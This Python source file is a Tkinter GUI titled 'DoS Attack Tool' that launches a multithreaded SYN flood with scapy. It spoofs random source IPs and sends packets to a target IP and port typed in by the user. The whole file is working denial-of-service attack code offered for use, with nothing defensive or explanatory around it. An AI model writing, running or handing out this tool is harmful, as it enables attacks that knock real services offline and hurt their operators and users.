import tkinter as tk
from tkinter import scrolledtext, messagebox
from threading import Thread
from scapy.all import *
from random import randint
import time
import ipaddress

# Function to generate a random spoofed IP
def randomIP():
    return ".".join(map(str, (randint(1, 255) for _ in range(4))))

# Function to generate a random integer for ports
def randInt():
    return randint(1000, 9000)

# Function to validate IPv4 address
def validate_ip(ip):
    try:
        ipaddress.ip_address(ip)
        return True
    except ValueError:
        return False

# Function to execute a SYN Flood attack
def SYN_Flood(dstIP, dstPort, counter, rate_limit, output_text):
    total = 0
    output_text.insert(tk.END, "Starting SYN Flood...\n")
    output_text.see(tk.END)

    try:
        for _ in range(counter):
            s_port = randInt()
            s_eq = randInt()
            w_indow = randInt()
            src_ip = randomIP()

            IP_Packet = IP(src=src_ip, dst=dstIP)
            TCP_Packet = TCP(sport=s_port, dport=int(dstPort), flags="S", seq=s_eq, window=w_indow)

            send(IP_Packet / TCP_Packet, verbose=0)

            total += 1

            if rate_limit > 0:
                time.sleep(1 / rate_limit)  # Rate limiting

            # Update GUI every 100 packets
            if total % 100 == 0:
                output_text.insert(tk.END, f"Sent {total} packets...\n")
                output_text.see(tk.END)

        output_text.insert(tk.END, f"\nTotal packets sent: {total}\n")
        output_text.see(tk.END)

    except KeyboardInterrupt:
        output_text.insert(tk.END, "\n[!] Attack interrupted by user. Exiting...\n")
    except Exception as e:
        output_text.insert(tk.END, f"\n[!] Error occurred: {e}\n")

# Function to execute SYN Flood attack in multiple threads
def SYN_Flood_Threaded(dstIP, dstPort, counter, threads, rate_limit, output_text):
    def flood_worker(packet_count):
        SYN_Flood(dstIP, dstPort, packet_count, rate_limit, output_text)

    output_text.insert(tk.END, "Starting multithreaded SYN Flood...\n")
    output_text.see(tk.END)

    thread_list = []
    packets_per_thread = counter // threads

    for _ in range(threads):
        t = Thread(target=flood_worker, args=(packets_per_thread,))
        thread_list.append(t)
        t.start()

    for t in thread_list:
        t.join()

    output_text.insert(tk.END, "Attack completed.\n")
    output_text.see(tk.END)

# Function to start the attack when the button is clicked
def start_attack(ip_entry, port_entry, count_entry, thread_entry, rate_entry, output_text):
    dstIP = ip_entry.get().strip()
    dstPort = port_entry.get().strip()
    counter = count_entry.get().strip()
    threads = thread_entry.get().strip()
    rate_limit = rate_entry.get().strip()

    # Input validation
    if not validate_ip(dstIP):
        messagebox.showerror("Input Error", "Invalid IP address. Use a valid IPv4 format.")
        return

    try:
        dstPort = int(dstPort)
        counter = int(counter)
        threads = int(threads)
        rate_limit = int(rate_limit)
    except ValueError:
        messagebox.showerror("Input Error", "Port, Packet Count, Threads, and Rate must be numbers.")
        return

    if dstPort < 1 or dstPort > 65535:
        messagebox.showerror("Input Error", "Invalid port number. Use a value between 1 and 65535.")
        return

    if counter < 1:
        messagebox.showerror("Input Error", "Packet count must be greater than 0.")
        return

    if threads < 1:
        messagebox.showerror("Input Error", "Thread count must be at least 1.")
        return

    output_text.insert(tk.END, f"Target: {dstIP}\nPort: {dstPort}\nTotal Packets: {counter}\nThreads: {threads}\nRate Limit: {rate_limit} packets/sec\n\n")
    output_text.see(tk.END)

    # Start attack in a separate thread
    attack_thread = Thread(target=SYN_Flood_Threaded, args=(dstIP, dstPort, counter, threads, rate_limit, output_text), daemon=True)
    attack_thread.start()

# Function to create the DoS Attack GUI with a back button
def dos_attack_gui(main_menu):
    root = tk.Toplevel()
    root.title("DoS Attack Tool")
    root.geometry("500x450")

    # Labels & Input Fields
    tk.Label(root, text="Target IP:").grid(row=0, column=0)
    ip_entry = tk.Entry(root, width=30)
    ip_entry.grid(row=0, column=1)

    tk.Label(root, text="Target Port:").grid(row=1, column=0)
    port_entry = tk.Entry(root, width=10)
    port_entry.grid(row=1, column=1)

    tk.Label(root, text="Packet Count:").grid(row=2, column=0)
    count_entry = tk.Entry(root, width=10)
    count_entry.grid(row=2, column=1)

    tk.Label(root, text="Threads:").grid(row=3, column=0)
    thread_entry = tk.Entry(root, width=10)
    thread_entry.grid(row=3, column=1)

    tk.Label(root, text="Rate Limit (Packets/sec):").grid(row=4, column=0)
    rate_entry = tk.Entry(root, width=10)
    rate_entry.grid(row=4, column=1)

    # Output Display
    output_text = scrolledtext.ScrolledText(root, width=60, height=10)
    output_text.grid(row=5, column=0, columnspan=2)

    # Back Button
    def go_back():
        root.destroy()  # Close this window
        main_menu.deiconify()  # Show the main menu again

    # Start Attack Button
    attack_button = tk.Button(root, text="Start Attack", command=lambda: start_attack(ip_entry, port_entry, count_entry, thread_entry, rate_entry, output_text), width=15)
    attack_button.grid(row=6, column=0, pady=10)

    # Back Button
    back_button = tk.Button(root, text="Back", command=go_back, width=15)
    back_button.grid(row=6, column=1, pady=10)

    root.mainloop()
